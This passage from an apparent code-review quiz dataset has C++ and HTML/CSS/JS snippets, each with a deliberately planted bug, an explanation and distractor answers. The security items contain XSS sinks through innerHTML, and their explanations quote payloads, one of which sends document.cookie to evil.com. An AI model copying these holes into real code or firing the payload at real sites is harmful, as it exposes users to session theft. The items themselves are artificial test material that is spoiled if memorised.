                    "Both `globalLogger` and `globalMetrics` are globals with non-trivial constructors in "
                    "DIFFERENT .cpp files - the C++ standard does not guarantee the order in which global "
                    "objects in separate translation units are constructed relative to each other. If "
                    "`globalMetrics` happens to get constructed before `globalLogger`, `Metrics`'s constructor "
                    "reads `globalLogger.prefix` before it's been initialized - undefined behavior (the "
                    "'static initialization order fiasco'). The standard fix is the Construct-On-First-Use "
                    "idiom: wrap the global in a function returning a function-local static, which C++ "
                    "guarantees is initialized the first time that function is actually called, not at some "
                    "unspecified program-startup order."
                ),
            }],
            ["Data race on shared state", "Memory leak on early return", "Unnecessary copy instead of emplace/move"],
        ),
        _entry(
            "medium", "Enums", "Order Status Check",
            "#include <cstdio>\n"
            "\n"
            "enum OrderStatus { PENDING, SHIPPED, DELIVERED, CANCELLED };  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "enum PaymentStatus { UNPAID, PAID, REFUNDED };\n"
            "\n"
            "bool canShip(OrderStatus status) {\n"
            "    return status == PAID;  // meant to check payment, wrote the wrong variable\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"can ship: %s\\n\", canShip(PENDING) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Unscoped enum allows unintended implicit conversion",
                "explanation": (
                    "`OrderStatus` and `PaymentStatus` are plain (unscoped) enums, whose values implicitly "
                    "convert to `int` and can be compared across completely unrelated enum types with no "
                    "compiler warning - `status == PAID` compiles fine even though `status` is an `OrderStatus` "
                    "and `PAID` is a `PaymentStatus` value that happens to share the same underlying int (1, "
                    "SHIPPED vs PAID). `enum class OrderStatus { ... }` (a scoped enum) would make this a "
                    "compile error, since scoped enum values don't implicitly convert to int or compare across "
                    "unrelated enum types - exactly the safety unscoped enums lack."
                ),
            }],
            ["Invalid comparator (not strict weak ordering)", "Public data member instead of encapsulated", "Off-by-one bounds error"],
        ),
        _entry(
            "medium", "Recursion", "Directory Size",
            "#include <string>\n"
            "#include <vector>\n"
            "\n"
            "struct DirEntry { std::string name; bool isDir; std::vector<DirEntry> children; long sizeBytes; };\n"
            "\n"
            "// Sums the total size of a directory tree for a storage-usage report.\n"
            "long totalSize(const DirEntry& entry) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    if (!entry.isDir) {\n"
            "        return entry.sizeBytes;\n"
            "    }\n"
            "    long sum = 0;\n"
            "    for (const auto& child : entry.children) {\n"
            "        sum += totalSize(child);\n"
            "    }\n"
            "    return sum;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    DirEntry root{\"root\", true, {{\"a.txt\", false, {}, 1024}}, 0};\n"
            "    printf(\"total: %ld\\n\", totalSize(root));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing base case risks stack overflow",
                "explanation": (
                    "The base case here only stops recursion once `entry.isDir` is false - but nothing bounds "
                    "how DEEP a directory tree of nested directories can go, and each recursive call consumes "
                    "another stack frame. A real filesystem walk needs a depth guard (or should be converted to "
                    "an explicit iterative stack/queue) because a sufficiently deep or maliciously crafted "
                    "(e.g. symlink-cycle) directory structure can exhaust the call stack - a genuine crash risk "
                    "recursive tree-walking functions need to account for, not just a correctness edge case."
                ),
            }],
            ["Unbounded recursion risk", "Data race on shared state", "Unnecessary copy instead of emplace/move"],
        ),
        _entry(
            "hard", "Virtual Destructors", "Cleanup via Base Pointer",
            "#include <cstdio>\n"
            "\n"
            "class Connection {\n"
            "public:\n"
            "    ~Connection() { printf(\"closing base connection\\n\"); }  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "};\n"
            "\n"
            "class PooledConnection : public Connection {\n"
            "public:\n"
            "    ~PooledConnection() { printf(\"returning to pool\\n\"); }\n"
            "private:\n"
            "    int poolSlot_ = 0;\n"
            "};\n"
            "\n"
            "int main() {\n"
            "    Connection* c = new PooledConnection();\n"
            "    delete c;\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Non-virtual destructor causes incomplete cleanup via base pointer",
                "explanation": (
                    "`delete c` deletes through a `Connection*`, but `Connection`'s destructor isn't `virtual` - "
                    "so the compiler only calls `Connection::~Connection()`, never `PooledConnection::"
                    "~PooledConnection()`, meaning the pool slot never gets released and any resources "
                    "PooledConnection owns leak (this is also undefined behavior per the standard, not merely "
                    "'incomplete'). Any class intended to be deleted polymorphically through a base pointer "
                    "needs `virtual ~Connection() = default;` so the derived destructor runs first."
                ),
            }],
            ["Object slicing via pass-by-value", "Memory leak on early return", "No self-assignment check"],
        ),
        _entry(
            "hard", "Concurrency", "Lazy Singleton Init",
            "#include <mutex>\n"
            "\n"
            "class ConfigCache {\n"
            "public:\n"
            "    static ConfigCache* instance() {\n"
            "        if (instance_ == nullptr) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "            std::lock_guard<std::mutex> lock(mutex_);\n"
            "            if (instance_ == nullptr) {\n"
            "                instance_ = new ConfigCache();\n"
            "            }\n"
            "        }\n"
            "        return instance_;\n"
            "    }\n"
            "private:\n"
            "    static ConfigCache* instance_;\n"
            "    static std::mutex mutex_;\n"
            "};\n"
            "ConfigCache* ConfigCache::instance_ = nullptr;\n"
            "std::mutex ConfigCache::mutex_;\n"
            "\n"
            "int main() {\n"
            "    ConfigCache::instance();\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Unsynchronized lazy initialization race",
                "explanation": (
                    "This is double-checked locking, but the FIRST check (`instance_ == nullptr`) reads "
                    "`instance_` with no synchronization at all, outside the mutex - one thread can be "
                    "mid-construction inside the locked section (writing to `instance_` and the object it "
                    "points to isn't necessarily fully visible yet) while another thread's unsynchronized first "
                    "check reads a partially-constructed or torn pointer value, a data race and undefined "
                    "behavior. Making `instance_` a `std::atomic<ConfigCache*>` (with acquire/release ordering "
                    "on the check/store), or simplest, using a C++11 function-local `static` (whose "
                    "initialization the standard guarantees is thread-safe with no manual locking at all), "
                    "avoids hand-rolling this correctly."
                ),
            }],
            ["Lock ordering deadlock", "Data race on shared state", "Non-virtual destructor causes incomplete cleanup via base pointer"],
        ),
        _entry(
            "hard", "Type Punning", "Reading Raw Bytes",
            "#include <cstdint>\n"
            "#include <cstdio>\n"
            "\n"
            "// Interprets the first 4 bytes of a received network buffer as\n"
            "// a big-endian message length prefix.\n"
            "uint32_t readLength(const char* buffer) {\n"
            "    uint32_t length = *reinterpret_cast<const uint32_t*>(buffer);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    return length;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    char packet[] = {0x00, 0x00, 0x00, 0x2a, 'd', 'a', 't', 'a'};\n"
            "    printf(\"length: %u\\n\", readLength(packet));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Strict aliasing violation via reinterpret_cast",
                "explanation": (
                    "Reinterpreting a `char*` as a `uint32_t*` and dereferencing it violates C++'s strict "
                    "aliasing rule (an object generally can't be accessed through a pointer of an unrelated "
                    "type) - the compiler is allowed to assume a `uint32_t*` and a `char*` never alias the same "
                    "memory, which can lead to miscompiled/reordered reads with optimizations enabled (undefined "
                    "behavior, not just a style nit), and it also silently ignores byte order, since this reads "
                    "native-endian, not the big-endian format the comment claims. The safe way to reinterpret "
                    "bytes is `memcpy` into a properly-typed variable (which the compiler is required to handle "
                    "correctly and can often optimize into the same code anyway), combined with explicit "
                    "byte-order conversion for a wire format."
                ),
            }],
            ["Integer overflow from narrow type multiplication", "Uninitialized variable used", "Comparing floats with =="],
        ),
        _entry(
            "hard", "Smart Pointers", "Parent Child Links",
            "#include <memory>\n"
            "#include <string>\n"
            "#include <vector>\n"
            "\n"
            "struct TreeNode {\n"
            "    std::string name;\n"
            "    std::vector<std::shared_ptr<TreeNode>> children;\n"
            "    std::shared_ptr<TreeNode> parent;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "};\n"
            "\n"
            "std::shared_ptr<TreeNode> makeChild(std::shared_ptr<TreeNode> parent, const std::string& name) {\n"
            "    auto child = std::make_shared<TreeNode>();\n"
            "    child->name = name;\n"
            "    child->parent = parent;\n"
            "    parent->children.push_back(child);\n"
            "    return child;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    auto root = std::make_shared<TreeNode>();\n"
            "    root->name = \"root\";\n"
            "    makeChild(root, \"leaf\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Reference cycle from shared_ptr causes leak",
                "explanation": (
                    "The parent holds each child via `shared_ptr` in `children`, and every child holds its "
                    "parent via `shared_ptr` too - a reference cycle. `shared_ptr`'s reference count for both "
                    "objects never reaches zero (each keeps the other alive), so neither is ever destroyed even "
                    "after the last EXTERNAL reference (like `root` going out of scope) disappears - a real "
                    "memory leak that ASan/leak detectors will flag but that doesn't crash, making it easy to "
                    "miss. The child's `parent` link should be a `std::weak_ptr<TreeNode>` instead - it lets the "
                    "child reach its parent when needed (via `.lock()`) without contributing to the parent's "
                    "shared ownership count."
                ),
            }],
            ["Manual delete of a unique_ptr-owned resource", "Dangling reference to a local", "Data race on shared state"],
        ),
        _entry(
            "hard", "Multiple Inheritance", "Vehicle Hierarchy",
            "#include <cstdio>\n"
            "\n"
            "class Engine { public: int horsepower = 200; };\n"
            "class Vehicle : public Engine { public: std::string name; };\n"
            "class Boat : public Engine { public: bool hasSail = false; };\n"
            "class AmphibiousCar : public Vehicle, public Boat {};  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "\n"
            "int main() {\n"
            "    AmphibiousCar car;\n"
            "    printf(\"horsepower: %d\\n\", car.horsepower);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Diamond inheritance without virtual base duplicates state",
                "explanation": (
                    "`AmphibiousCar` inherits from both `Vehicle` and `Boat`, which BOTH inherit from `Engine` - "
                    "without `virtual` inheritance, `AmphibiousCar` ends up with two entirely separate `Engine` "
                    "subobjects (one via Vehicle, one via Boat), each with its own independent `horsepower`. "
                    "`car.horsepower` is actually ambiguous and won't even compile as written (the compiler "
                    "can't tell which Engine subobject you mean) - the real fix is `class Vehicle : public "
                    "virtual Engine` and `class Boat : public virtual Engine`, which makes both paths share a "
                    "single Engine subobject, resolving both the ambiguity and the duplicated state."
                ),
            }],
            ["Non-virtual destructor causes incomplete cleanup via base pointer", "Object slicing via pass-by-value", "Reference cycle from shared_ptr causes leak"],
        ),
        _entry(
            "expert", "Templates", "Generic Wrapper",
            "#include <utility>\n"
            "#include <vector>\n"
            "\n"
            "template <typename T>\n"
            "void enqueue(std::vector<T>& queue, T&& item) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    queue.push_back(item);\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<std::string> queue;\n"
            "    std::string payload = \"large-order-payload\";\n"
            "    enqueue(queue, std::move(payload));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing std::forward defeats perfect forwarding",
                "explanation": (
                    "`T&& item` here is a forwarding (universal) reference since `T` is deduced, but the body "
                    "passes `item` straight to `push_back(item)` - inside the function, `item` is itself an "
                    "lvalue (it has a name), so this always calls the COPY overload of `push_back`, even when "
                    "the caller explicitly passed an rvalue via `std::move(payload))` to signal it wanted a "
                    "move. The whole point of a forwarding reference is to preserve the caller's original "
                    "value category through to the next call - that requires `queue.push_back(std::forward<T>"
                    "(item));`, which forwards it as an rvalue only when the caller actually passed one."
                ),
            }],
            ["Use-after-move", "Reference cycle from shared_ptr causes leak", "Object slicing via pass-by-value"],
        ),
        _entry(
            "expert", "Undefined Behavior", "Buffer Bounds Check",
            "#include <cstdio>\n"
            "\n"
            "// Validates that reading `len` bytes starting at `offset` stays\n"
            "// inside a buffer of `bufferSize` bytes.\n"
            "bool isInBounds(int offset, int len, int bufferSize) {\n"
            "    return offset + len <= bufferSize;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    int offset = 2147483600;\n"
            "    int len = 200;\n"
            "    printf(\"in bounds: %s\\n\", isInBounds(offset, len, 4096) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Signed integer overflow is undefined behavior",
                "explanation": (
                    "`offset + len` can overflow a signed `int` when `offset` is attacker- or "
                    "corruption-controlled and close to INT_MAX (as in `main`'s example: 2147483600 + 200 "
                    "overflows) - unlike unsigned overflow (well-defined wraparound), SIGNED integer overflow is "
                    "undefined behavior in C++, meaning the compiler is free to assume it never happens and can "
                    "optimize the check away entirely, or produce any result. Worse, this is exactly the kind of "
                    "bug that turns into a real security hole: the intended bounds check can be defeated by a "
                    "crafted offset, letting a read land outside the buffer. Use a wider type for the "
                    "arithmetic (`int64_t`) or explicitly check `offset > bufferSize - len` style logic that "
                    "can't overflow for valid `bufferSize`/`len`."
                ),
            }],
            ["Integer overflow from narrow type multiplication", "Strict aliasing violation via reinterpret_cast", "Missing std::forward defeats perfect forwarding"],
        ),
    ],
    "html_css": [
        _entry(
            "easy", "Accessibility", "Product Image",
            "<article class=\"product-card\">\n"
            "  <a href=\"/products/hiking-boots\">\n"
            "    <img src=\"/img/hiking-boots.jpg\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  </a>\n"
            "  <h3>Trailblazer Hiking Boots</h3>\n"
            "  <p class=\"price\">$89.99</p>\n"
            "  <ul class=\"badges\">\n"
            "    <li>Free returns</li>\n"
            "    <li>In stock</li>\n"
            "  </ul>\n"
            "  <button type=\"button\" class=\"add-to-cart\">Add to cart</button>\n"
            "</article>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing alt text",
                "explanation": (
                    "Missing `alt` text on an informative image - screen readers announce it as just 'image' (or "
                    "the raw filename in some browsers), giving a blind user no idea what's being sold. Add a "
                    "descriptive `alt=\"Trailblazer Hiking Boots\"`; only purely decorative images should get "
                    "`alt=\"\"`."
                ),
            }],
            ["z-index without positioning", "Non-semantic div used for interactive control", "Overuse of !important"],
        ),
        _entry(
            "easy", "Semantic HTML", "Clickable Card",
            "<section class=\"catalog\">\n"
            "  <h2>Featured</h2>\n"
            "  <div class=\"card\" onclick=\"openProduct(42)\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    <img src=\"/img/hiking-boots.jpg\" alt=\"Trailblazer Hiking Boots\">\n"
            "    <h3>Trailblazer Hiking Boots</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "  <div class=\"card\" onclick=\"openProduct(43)\">\n"
            "    <img src=\"/img/trail-socks.jpg\" alt=\"Trail Socks\">\n"
            "    <h3>Trail Socks</h3>\n"
            "    <p>View details</p>\n"
            "  </div>\n"
            "</section>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Non-semantic div used for interactive control",
                "explanation": (
                    "A `<div onclick>` isn't keyboard-focusable or announced as interactive by screen readers - a "
                    "keyboard-only or screen-reader user has no way to activate it. Use a real `<button>` (or an "
                    "`<a>` if it's real navigation), which gets focus, Enter/Space activation, and correct semantics "
                    "for free."
                ),
            }],
            ["Missing alt text", "Missing form label association", "Color contrast too low for accessibility"],
        ),
        _entry(
            "medium", "Positioning", "Dropdown Menu",
            ".nav {\n"
            "  display: flex;\n"
            "  align-items: center;\n"
            "  gap: 16px;\n"
            "}\n"
            "\n"
            ".dropdown {\n"
            "  position: relative;\n"
            "}\n"
            "\n"
            ".dropdown-menu {\n"
            "  z-index: 999;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  top: 100%;\n"
            "  left: 0;\n"
            "  min-width: 180px;\n"
            "  background: white;\n"
            "  box-shadow: 0 2px 8px rgba(0,0,0,0.2);\n"
            "}\n"
            "\n"
            ".dropdown-menu.open {\n"
            "  display: block;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "z-index without positioning",
                "explanation": (
                    "`z-index` only has an effect on a positioned element (`position` set to anything other than the "
                    "default `static`) - without a `position` declaration on `.dropdown-menu` itself, this `z-index: "
                    "999` does nothing, and the dropdown can still render behind other content. Add `position: "
                    "absolute` alongside it."
                ),
            }],
            ["Missing alt text", "XSS via unescaped innerHTML", "Unscoped global CSS selector"],
        ),
        _entry(
            "medium", "Specificity", "Theming Override",
            ":root {\n"
            "  --brand-blue: #2b6cff;\n"
            "}\n"
            "\n"
            ".btn {\n"
            "  padding: 10px 18px;\n"
            "  border-radius: 6px;\n"
            "}\n"
            "\n"
            ".btn-primary {\n"
            "  background: var(--brand-blue);\n"
            "}\n"
            "\n"
            "#header .btn-primary {\n"
            "  background: var(--brand-blue) !important;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn-primary:hover {\n"
            "  filter: brightness(1.1);\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Overuse of !important",
                "explanation": (
                    "Reaching for `!important` to beat an ID selector's specificity is a smell, not a fix - it wins "
                    "this battle but makes every future override of `#header .btn-primary` need `!important` too, "
                    "escalating indefinitely. Fix the actual cause (an ID selector styling a reusable component) "
                    "rather than papering over it."
                ),
            }],
            ["Missing viewport meta tag", "Layout thrashing from forced reflow", "z-index without positioning"],
        ),
        _entry(
            "hard", "Security", "Comment Renderer",
            "function fetchComments(postId) {\n"
            "  return fetch(`/api/posts/${postId}/comments`).then(r => r.json());\n"
            "}\n"
            "\n"
            "function renderComment(comment) {\n"
            "  const el = document.getElementById('comments');\n"
            "  el.innerHTML += `<div class=\"comment\">${comment.author}: ${comment.text}</div>`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "async function loadComments(postId) {\n"
            "  const comments = await fetchComments(postId);\n"
            "  document.getElementById('comments').innerHTML = '';\n"
            "  comments.forEach(renderComment);\n"
            "}\n"
            "\n"
            "document.addEventListener('DOMContentLoaded', () => {\n"
            "  loadComments(window.CURRENT_POST_ID);\n"
            "});\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "XSS via unescaped innerHTML",
                "explanation": (
                    "Stored/reflected XSS: `comment.text` (and `.author`) come from user input and get concatenated "
                    "straight into `innerHTML` with no escaping - a comment containing `<img src=x "
                    "onerror=\"steal()\">` executes arbitrary JS for every viewer. Use `textContent`/`createElement` "
                    "for user-supplied text, or run it through a proper HTML-escaping function before interpolating."
                ),
            }],
            ["z-index without positioning", "Unscoped global CSS selector", "Missing form label association"],
        ),
        _entry(
            "hard", "Responsive Design", "Sidebar Layout",
            ".page {\n"
            "  display: flex;\n"
            "  min-height: 100vh;\n"
            "}\n"
            "\n"
            ".sidebar {\n"
            "  width: 320px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  flex-shrink: 0;\n"
            "  background: #1a1a2e;\n"
            "}\n"
            "\n"
            ".content {\n"
            "  width: 900px;\n"
            "  padding: 24px;\n"
            "}\n"
            "\n"
            ".content h1 {\n"
            "  font-size: 1.8rem;\n"
            "  margin-bottom: 12px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Fixed pixel widths break responsiveness",
                "explanation": (
                    "Fixed pixel widths on both flex children add up to 1220px regardless of viewport size - on any "
                    "screen narrower than that (most phones), the layout overflows and forces horizontal scrolling "
                    "instead of reflowing. Give `.content` `flex: 1` (or a `max-width` + `min-width: 0`) so it "
                    "shrinks with the viewport instead of a hardcoded width."
                ),
            }],
            ["Missing alt text", "Overuse of !important", "Color contrast too low for accessibility"],
        ),
        _entry(
            "expert", "Media Queries", "Mobile-First Breakpoints",
            ".nav {\n"
            "  display: flex;\n"
            "  flex-direction: column;\n"
            "}\n"
            "\n"
            "@media (min-width: 1024px) {\n"
            "  .nav { display: none; }\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  .nav { display: flex; flex-direction: row; }\n"
            "}\n"
            "\n"
            ".nav-toggle {\n"
            "  display: block;\n"
            "}\n"
            "\n"
            "@media (min-width: 640px) {\n"
            "  .nav-toggle { display: none; }\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Media query source-order bug",
                "explanation": (
                    "Source-order bug: both rules have equal specificity, so on any viewport >=1024px CSS's cascade "
                    "applies the *later* rule (`min-width: 640px`, which also matches) last, silently un-hiding the "
                    "nav the first rule just hid. Mobile-first breakpoints need to be written in ascending order "
                    "(smallest `min-width` first) so each wider rule correctly overrides the narrower one before it."
                ),
            }],
            ["Fixed pixel widths break responsiveness", "Missing viewport meta tag", "Unscoped global CSS selector"],
        ),
        _entry(
            "expert", "Security", "Search Results Template",
            "function escapeHtml(str) {\n"
            "  const div = document.createElement('div');\n"
            "  div.textContent = str;\n"
            "  return div.innerHTML;\n"
            "}\n"
            "\n"
            "function showResults(query, results) {\n"
            "  document.getElementById('heading').innerHTML = `Results for \"${query}\"`;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  const list = document.getElementById('results-list');\n"
            "  list.innerHTML = '';\n"
            "  results.forEach(r => {\n"
            "    list.innerHTML += `<li>${r.title}</li>`;  \xe2\x80\xa1bug2\xe2\x80\xa1\n"
            "  });\n"
            "}\n"
            "\n"
            "document.getElementById('search-form').addEventListener('submit', (e) => {\n"
            "  e.preventDefault();\n"
            "  const query = document.getElementById('search-input').value;\n"
            "  runSearch(query).then(results => showResults(query, results));\n"
            "});\n",
            [
                {
                    "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "The search `query` comes straight from user input (the search box/URL) and is interpolated "
                        "into `innerHTML` unescaped - a query like `<img src=x onerror=\"fetch('//evil.com?c='+"
                        "document.cookie)\">` runs in every visitor's session. `escapeHtml` is defined right above "
                        "but never used here."
                    ),
                },
                {
                    "marker": "\xe2\x80\xa1bug2\xe2\x80\xa1",
                    "reason": "XSS via unescaped innerHTML",
                    "explanation": (
                        "Each result's `title` (user-generated content, e.g. a product listing name) gets the same "
                        "unescaped treatment inside the loop, giving a second injection point. Both spots should "
                        "route through `escapeHtml` (or build the DOM with `textContent`/`createElement`) instead of "
                        "string-concatenated `innerHTML`."
                    ),
                },
            ],
            ["Missing form label association", "Media query source-order bug", "Layout thrashing from forced reflow"],
        ),
        _entry(
            "easy", "Forms", "Newsletter Signup",
            "<form class=\"signup\">\n"
            "  <p>Email address</p>\n"
            "  <input type=\"email\" id=\"signup-email\" placeholder=\"you@example.com\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <button type=\"submit\">Subscribe</button>\n"
            "</form>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing form label association",
                "explanation": (
                    "The `<p>Email address</p>` above the input is just plain text, not a `<label>` - it's not "
                    "programmatically tied to `#signup-email`, so a screen reader announces the field with no name "
                    "at all (or falls back to the placeholder, which disappears once typing starts and isn't a "
                    "reliable substitute). Use `<label for=\"signup-email\">Email address</label>` instead."
                ),
            }],
            ["Missing alt text", "z-index without positioning", "Overuse of !important"],
        ),
        _entry(
            "easy", "Box Model", "Fixed-Width Badge",
            ".badge {\n"
            "  width: 80px;\n"
            "  padding: 8px 12px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  border: 2px solid #268bd2;\n"
            "  text-align: center;\n"
            "  border-radius: 4px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Box model overflow from missing box-sizing",
                "explanation": (
                    "By default (`box-sizing: content-box`), `width: 80px` sets only the content area - the 12px "
                    "left/right padding and 2px border are added on top, so the badge actually renders at "
                    "80 + 24 + 4 = 108px, not the intended 80px, which breaks alignment against anything sized to "
                    "exactly 80px. Add `box-sizing: border-box` (usually globally, in a reset) so width includes "
                    "padding and border."
                ),
            }],
            ["z-index without positioning", "Unscoped global CSS selector", "Missing alt text"],
        ),
        _entry(
            "medium", "Flexbox", "Filter Chip Row",
            ".filter-row {\n"
            "  display: flex;\n"
            "  gap: 8px;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".filter-chip {\n"
            "  padding: 6px 14px;\n"
            "  border-radius: 999px;\n"
            "  white-space: nowrap;\n"
            "  background: #eee;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing flex-wrap causes overflow",
                "explanation": (
                    "Flex containers default to `flex-wrap: nowrap`, so once enough chips are added to exceed the "
                    "row's width (common on narrow/mobile viewports), they either overflow the container or get "
                    "squeezed/shrunk instead of dropping to a new line. Add `flex-wrap: wrap` so extra chips flow "
                    "onto additional rows instead of breaking the layout."
                ),
            }],
            ["Undefined CSS custom property with no fallback", "z-index without positioning", "Missing form label association"],
        ),
        _entry(
            "medium", "CSS Variables", "Theme Accent Color",
            ":root {\n"
            "  --accent-color: #2b6cff;\n"
            "}\n"
            "\n"
            ".alert-banner {\n"
            "  background: var(--accet-color);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  color: white;\n"
            "  padding: 12px 16px;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Undefined CSS custom property with no fallback",
                "explanation": (
                    "`--accet-color` is a typo of `--accent-color` - CSS custom properties don't error on a typo like "
                    "a compiler would, they just silently resolve to nothing (an undefined custom property has no "
                    "value), and with no fallback provided (`var(--accet-color, someDefault)`), the `background` "
                    "declaration is invalid and simply doesn't apply, leaving the banner with no background at all "
                    "and no console warning pointing at the real cause."
                ),
            }],
            ["Missing flex-wrap causes overflow", "Box model overflow from missing box-sizing", "Overuse of !important"],
        ),
        _entry(
            "hard", "Performance", "Batch Layout Read",
            "function highlightLongTitles(cards) {\n"
            "  cards.forEach(card => {\n"
            "    const width = card.offsetWidth;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    card.style.height = width < 200 ? '120px' : '80px';\n"
            "  });\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Layout thrashing from forced reflow",
                "explanation": (
                    "Reading `offsetWidth` (a layout-dependent property) forces the browser to synchronously "
                    "recompute layout to answer it - fine once, but this loop alternates a layout READ "
                    "(`offsetWidth`) with a layout-invalidating WRITE (`style.height`) on every single iteration, so "
                    "each subsequent read can't reuse the previous computation and forces a fresh, synchronous reflow "
                    "every time ('layout thrashing'). Fix by batching: read all the widths first into an array, then "
                    "apply all the height writes in a second pass, so layout is computed once instead of once per card."
                ),
            }],
            ["Missing flex-wrap causes overflow", "Undefined CSS custom property with no fallback", "Media query source-order bug"],
        ),
        _entry(
            "hard", "Accessibility", "Custom Toggle Switch",
            "<div class=\"toggle\" onclick=\"toggleNotifications(this)\">  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "  <div class=\"toggle-thumb\"></div>\n"
            "</div>\n"
            "\n"
            "<style>\n"
            ".toggle { width: 44px; height: 24px; border-radius: 12px; background: #ccc; position: relative; }\n"
            ".toggle.on { background: #2ecc71; }\n"
            ".toggle-thumb { width: 20px; height: 20px; border-radius: 50%; background: white; position: absolute; top: 2px; left: 2px; transition: left 0.15s; }\n"
            ".toggle.on .toggle-thumb { left: 22px; }\n"
            "</style>\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Custom control missing ARIA state/keyboard support",
                "explanation": (
                    "A styled `<div onclick>` toggle has none of a native `<input type=\"checkbox\">`'s built-in "
                    "behavior: it's not keyboard-focusable (no `tabindex`), doesn't respond to Enter/Space, and "
                    "exposes no on/off state to assistive tech (no `role=\"switch\"` and no `aria-checked`). A "
                    "screen-reader user has no way to discover it's a toggle, let alone its current state. Needs "
                    "`role=\"switch\"`, `aria-checked=\"true/false\"` kept in sync with the `.on` class, `tabindex=\"0\"`, "
                    "and a keydown handler for Space/Enter - or, more simply, use a real (visually-hidden but "
                    "functional) `<input type=\"checkbox\">` under the hood and style its label."
                ),
            }],
            ["Missing form label association", "Layout thrashing from forced reflow", "z-index without positioning"],
        ),
        _entry(
            "expert", "CSS Architecture", "Legacy Override Chain",
            ".btn {\n"
            "  background: #268bd2;\n"
            "  color: white;\n"
            "}\n"
            "\n"
            "#main-content .card .actions .btn {\n"
            "  background: #555 !important;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            ".btn-danger {\n"
            "  background: #dc322f;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Overuse of !important",
                "explanation": (
                    "`!important` on a deeply-nested, high-specificity selector forces this gray background to win "
                    "over EVERY other rule targeting `.btn` inside `.actions`, including `.btn-danger`, which now can "
                    "never turn a button red in that context no matter how specific it's made - short of adding "
                    "another `!important` (escalating the same arms race). The underlying problem is reaching for "
                    "`!important` + a long selector chain to force a win instead of fixing the actual specificity "
                    "conflict; the fix is to lower the original `.btn` rule's specificity/import order so it doesn't "
                    "need overriding this aggressively in the first place, or scope `.btn-danger` to compose cleanly "
                    "instead of fighting an ancestor-qualified override."
                ),
            }],
